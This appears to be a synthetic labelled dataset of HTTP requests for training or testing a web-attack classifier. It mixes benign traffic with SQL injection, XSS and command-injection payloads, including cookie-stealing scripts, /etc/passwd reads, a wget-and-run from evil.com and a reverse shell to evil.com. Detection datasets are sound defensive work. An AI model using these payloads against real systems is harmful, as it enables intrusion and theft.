method,url,headers,body,label
PUT,/apps/app-84278/dashboard,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/dashboard/apps/71086/metrics""}","{""price"": ""232"", ""email"": ""kubernetes"", ""quantity"": ""365""}",benign
POST,/account/preferences?input=%7C%20id%3Buname%20-a,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""linux"", ""price"": ""57""}",cmdi
DELETE,/api/apps/35610/deploy?sort=rating,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*""}",,benign
PUT,/account/preferences?brand=asus&lang=en&max=82370&input=eval%28%27alert%281%29%27%29,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/53549/profile""}","{""description"": ""pet"", ""value"": ""diner""}",xss
PUT,/categories/toys/products?limit=93&page=36,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.169.170.182""}","{""quantity"": ""388"", ""name"": ""studio"", ""description"": ""ansible"", ""username"": ""diner"", ""value"": ""obrien""}",benign
PUT,/register?ref=homepage&format=csv&category=sports,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""price"": ""488"", ""description"": ""salad"", ""email"": ""tutorial""}",benign
GET,/api/v1/users/53084/profile?q=ring&offset=79&category=clothing&ref=homepage,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/items/98346?sort=price_desc&limit=54&brand=samsung&id=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpassword%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.154.197.84""}",,sqli
PUT,/checkout/cart?q=project&max=9693,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""resume"", ""price"": ""39"", ""title"": ""tea"", ""quantity"": ""70""}",benign
PUT,/products/67783/reviews?page=31&input=<input autofocus onfocus=alert(1)>,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""studio"", ""quantity"": ""404"", ""username"": ""whiskas"", ""value"": ""salad""}",xss
DELETE,/api/v2/orders/46185/items?category=pets,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.65.204.92""}",,benign
POST,/search?ref=email&q=docker&format=csv&filter=docker,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""electronics"", ""quantity"": ""55"", ""title"": ""portfolio"", ""value"": ""book""}",benign
GET,/docs/electronics-villa?format=xml&filter=magazine,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/apps/14390/api/v1/items""}",,benign
GET,/login?page=48&category=pets&q=studio&id=`id`,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register""}",,cmdi
DELETE,/register?offset=449&format=csv,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/items/61856""}",,benign
PUT,/apps/63914/api/v1/items?search=<img src=x onerror=alert(document.cookie)>,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/app-88340/dashboard""}","{""username"": ""textbook"", ""quantity"": ""354""}",xss
DELETE,/docs/jacket-docker?sort=relevance&page=2&lang=fr,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,benign
PUT,/api/v2/orders/70556/items?min=3542,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""value"": ""pizza"", ""username"": ""guide"", ""title"": ""ring"", ""category"": ""juice"", ""quantity"": ""41""}",benign
GET,/apps/97639/api/v1/items?sort=price_asc,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.196.158.68""}",,benign
GET,/categories/electronics/products?q=cafe&category=sports&format=csv&brand=hp,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,benign
PUT,/products/70777/reviews?min=4905&q=how to drop table weight effectively,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.122.231.71""}","{""username"": ""biography"", ""category"": ""keyboard"", ""name"": ""rust"", ""price"": ""382""}",benign
PUT,/apps/59838?q=exec%20chef%20meal%20prep%20service,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register""}","{""email"": ""golang"", ""category"": ""house"", ""username"": ""apartment"", ""title"": ""bag"", ""quantity"": ""471""}",benign
DELETE,/api/apps/50983/deploy?offset=238&format=csv,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/apps/21840/deploy""}",,benign
GET,/docs/apartment-house?ref=homepage&sort=price_desc,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json""}",,benign
DELETE,/products/1457/reviews?q=docker&brand=sony,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register""}",,benign
POST,/checkout/cart,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/73700""}","{""username"": ""python"", ""title"": ""apartment""}",benign
POST,/login?offset=how to drop table weight effectively,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.41.179.166""}","{""category"": ""villa"", ""price"": ""491"", ""username"": ""shirt"", ""name"": ""electronics""}",benign
GET,"/api/v1/users/25962/profile?category=pets&format=csv&id=1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--","{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,sqli
GET,/dashboard/apps/99542/metrics,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,benign
PUT,/items/96479?limit=54&min=4341,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2026/kubernetes-journal-book""}","{""value"": ""laptop"", ""description"": ""smoothie"", ""quantity"": ""492""}",benign
GET,/docs/howto-portfolio?filter=kubernetes,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/account/preferences""}",,benign
POST,/apps/24081?format=json,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/58578""}","{""username"": ""pet"", ""value"": ""jacket"", ""price"": ""324""}",benign
PUT,/dashboard/apps/74638/metrics?filter=keyboard&q=novel&lang=de,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security"", ""x-forwarded-for"": ""10.231.196.208""}","{""description"": ""java"", ""email"": ""jacket"", ""value"": ""smoothie"", ""category"": ""food""}",benign
PUT,/docs/dog-golang-biography,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""obrien"", ""category"": ""studio"", ""value"": ""linux""}",benign
PUT,/search?ref=social&filter=ring&q=cafe,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""comment"": ""bag"", ""name"": ""electronics"", ""description"": ""';alert(String.fromCharCode(88,83,83))//""}",xss
DELETE,/api/v1/users/51267/profile?max=41575&sort=rating&brand=lenovo&search=eval%28%27alert%281%29%27%29,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/blog/2024/python-flat-trousers""}",,xss
POST,/apps/app-97229/dashboard?page=use `code` blocks in markdown&offset=430,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""description"": ""ansible"", ""quantity"": ""248"", ""email"": ""jacket""}",benign
PUT,/apps/app-70368/dashboard,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""search"": ""apartment"", ""comment"": ""| /bin/bash -c 'id'""}",cmdi
GET,/docs/shoes-ansible-linux-electronics?offset=373&brand=hp&limit=89&page=50,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json""}",,benign
POST,/api/v2/orders/73912/items?page=26&offset=348&limit=26,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/76364""}","{""price"": ""67"", ""username"": ""villa"", ""description"": ""rust""}",benign
DELETE,/admin/settings/security?lang=fr&sort=price_asc,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
DELETE,/products/48286/reviews?offset=298&brand=sony&max=53405&lang=ja,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,"/account/preferences?min=1805&search=localhost | python -c 'import os;os.system(""id"")'","{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,cmdi
DELETE,/apps/63649?offset=262&max=46429,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.198.248.137""}",,benign
GET,/api/apps/81953/deploy?q=; wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.61.197.55""}",,cmdi
DELETE,"/checkout/cart?max=87213&input=127.0.0.1
cat /etc/passwd","{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/v2/orders/3933/items""}",,cmdi
GET,/search?ref=email,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
PUT,/api/v1/users/12512/profile?filter=studio&max=5590,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/categories/clothing/products""}","{""username"": ""diner"", ""title"": ""keyboard"", ""category"": ""cafe"", ""email"": ""diner""}",benign
DELETE,/apps/47403?search=%60id%60,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
GET,/admin/settings/security?filter=linux&ref=homepage&q=shirt&lang=fr,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/apps/40250/api/v1/items?q=1' AND SLEEP(5)--,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml""}",,sqli
DELETE,/products/69955/reviews?brand=lg&format=json&id=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpassword%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/apps/70383/deploy""}",,sqli
DELETE,/register?q=whiskas,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/products/12618/reviews""}",,benign
POST,/products/47842/reviews?category=sports,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""pizza"", ""name"": ""biography"", ""value"": ""guide"", ""price"": ""260""}",benign
PUT,/account/preferences?category=<strong>sale</strong> ends today,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""linux"", ""name"": ""keyboard"", ""quantity"": ""143"", ""category"": ""watch""}",benign
PUT,/search?max=17593&offset=362&filter=dog,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/categories/clothing/products""}","{""value"": ""whiskas"", ""price"": ""226""}",benign
GET,/apps/app-64100/dashboard?lang=es,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/blog/2026/laptop-biography""}",,benign
GET,/api/v2/orders/61543/items?brand=whoami command line guide&min=302,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,benign
POST,/products/44666/reviews?offset=92&min=3219&sort=price_desc,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.238.145.206""}","{""name"": ""admin'--"", ""search"": ""resume""}",sqli
GET,/items/61248?limit=87&ref=search&max=58735&input=1' AND SLEEP(5)--,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*""}",,sqli
DELETE,/items/39199?category=sports&page=35,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,benign
POST,/checkout/cart?sort=price_asc&category=furniture&max=18201,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search""}","{""title"": ""novel"", ""price"": ""197""}",benign
PUT,/apps/68757/api/v1/items?brand=sony&min=1284&filter=bag&ref=price > 100 & < 500,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.129.6.118""}","{""price"": ""112"", ""name"": ""villa"", ""email"": ""typescript"", ""title"": ""food"", ""value"": ""pet""}",benign
DELETE,/checkout/cart?max=82695&lang=en,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.97.56.169""}",,benign
DELETE,/search?brand=purina,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/categories/electronics/products""}",,benign
DELETE,/api/v2/orders/65503/items?limit=order%20by%20date%20asc,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/blog/2025/monitor-headphones-java?brand=asus&page=49,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.161.16.143""}",,benign
POST,/categories/electronics/products?min=1740&input=%7C%20id%3Buname%20-a,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search"", ""x-forwarded-for"": ""10.27.74.59""}","{""price"": ""442"", ""email"": ""apartment""}",cmdi
PUT,/items/33140?min=4268&brand=asus,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""email"": ""ubuntu"", ""title"": ""keyboard""}",benign
PUT,/search,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""kubernetes"", ""name"": ""| bash -i >& /dev/tcp/evil.com/4444 0>&1"", ""comment"": ""docker"", ""value"": ""salad""}",cmdi
GET,/items/4888?page=20&brand=lg,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/api/v2/orders/9071/items""}",,benign
POST,/blog/2022/project-salad-flat?q=dress,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""email"": ""monitor"", ""description"": ""linux"", ""value"": ""headphones"", ""category"": ""juice""}",benign
DELETE,/api/v2/orders/5104/items?format=xml&q=novel&limit=22,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/items/27094?limit=40&min=2675&brand=apple,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,benign
DELETE,/login?lang=de&brand=sony,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/apps/82165/api/v1/items"", ""x-forwarded-for"": ""10.228.31.182""}",,benign
PUT,/items/90452?format=xml,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""description"": ""diner"", ""email"": ""coffee"", ""name"": ""laptop"", ""value"": ""house""}",benign
PUT,/blog/2025/cafe-dog-bag-magazine?format=json,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.232.69.244""}","{""search"": ""jacket"", ""value"": ""textbook"", ""description"": ""$(cat /etc/hosts)"", ""name"": ""shirt""}",cmdi
DELETE,/search?input=$(cat /etc/hosts),"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/45423"", ""x-forwarded-for"": ""10.209.36.164""}",,cmdi
PUT,/items/11834?search=' OR 1=1; DROP TABLE users--,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/91567/items""}","{""quantity"": ""37"", ""name"": ""house"", ""description"": ""textbook"", ""username"": ""electronics"", ""category"": ""cat""}",sqli
POST,/account/preferences?format=xml&min=2888,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""description"": ""ubuntu"", ""title"": ""burger""}",benign
DELETE,/docs/guide-laptop-electronics-cat?offset=474&ref=search&q=food,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
POST,/apps/10053/api/v1/items?filter=house&id=localhost;cat /etc/passwd,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""laptop"", ""category"": ""apartment""}",cmdi
DELETE,/apps/app-93032/dashboard?min=1907&lang=de&q=resume&search=%60whoami%60,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/account/preferences""}",,cmdi
POST,/api/apps/90392/deploy?sort=price_desc&offset=465&min=3621,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/47267/deploy"", ""x-forwarded-for"": ""10.217.12.141""}","{""title"": ""ubuntu"", ""name"": ""cafe"", ""quantity"": ""474"", ""username"": ""golang""}",benign
GET,/docs/burger-tea-rust-kubernetes,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/blog/2022/python-whiskas-food-docker""}",,benign
POST,/search,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""burger"", ""quantity"": ""499"", ""email"": ""studio"", ""title"": ""typescript""}",benign
DELETE,/admin/settings/security?page=24,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/docs/trousers-camera-journal""}",,benign
GET,/docs/ubuntu-ansible-coffee-javascript?min=1865&offset=225,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/admin/settings/security""}",,benign
DELETE,/account/preferences,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/items/66377?category=sports&search=<img src=x onerror=alert(document.cookie)>,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,xss
POST,/apps/app-59030/dashboard?max=19665&page=11&format=csv,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""rust"", ""name"": ""cat"", ""quantity"": ""152"", ""email"": ""ubuntu"", ""value"": ""studio""}",benign
PUT,/items/20925?format=xml&q=8.8.8.8%3B%20cat%20%2Fproc%2Fself%2Fenviron,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""coffee"", ""price"": ""174""}",cmdi
PUT,/api/v2/orders/11459/items?filter=ring&limit=88,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/64062/profile""}","{""title"": ""house"", ""quantity"": ""111""}",benign
DELETE,/items/10863?min=1913,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/categories/toys/products""}",,benign
PUT,/dashboard/apps/69578/metrics?offset=419&format=json,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register""}","{""price"": ""280"", ""category"": ""bag"", ""name"": ""whiskas"", ""email"": ""pet"", ""quantity"": ""457""}",benign
DELETE,/api/v2/orders/25448/items?format=use `code` blocks in markdown,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.46.173.6""}",,benign
PUT,/api/apps/18037/deploy?category=pets&page=39&max=93945&lang=fr,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""journal"", ""email"": ""novel""}",benign
PUT,/docs/textbook-cafe-project?lang=fr&sort=price_desc,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""category"": ""keyboard"", ""username"": ""rust"", ""name"": ""tutorial"", ""title"": ""dress""}",benign
POST,/apps/app-12932/dashboard,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/products/21417/reviews"", ""x-forwarded-for"": ""10.169.170.44""}","{""price"": ""137"", ""description"": ""ansible"", ""title"": ""keyboard""}",benign
POST,/apps/app-47381/dashboard?max=7553&sort=popularity&offset=410&category=furniture,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""title"": ""rust"", ""category"": ""electronics"", ""quantity"": ""339""}",benign
POST,/apps/90499?min=389&limit=21,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""cafe"", ""quantity"": ""173"", ""name"": ""linux"", ""value"": ""project""}",benign
GET,/api/apps/11074/deploy?category=onerror%20handling%20in%20python,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,benign
PUT,/dashboard/apps/50845/metrics?brand=dell&category=pets,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""price"": ""213"", ""title"": ""python"", ""category"": ""headphones"", ""description"": ""linux"", ""value"": ""headphones""}",benign
DELETE,/docs/terraform-villa-food?filter=linux&q=burger&offset=219&id=%0acat%20/etc/passwd,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
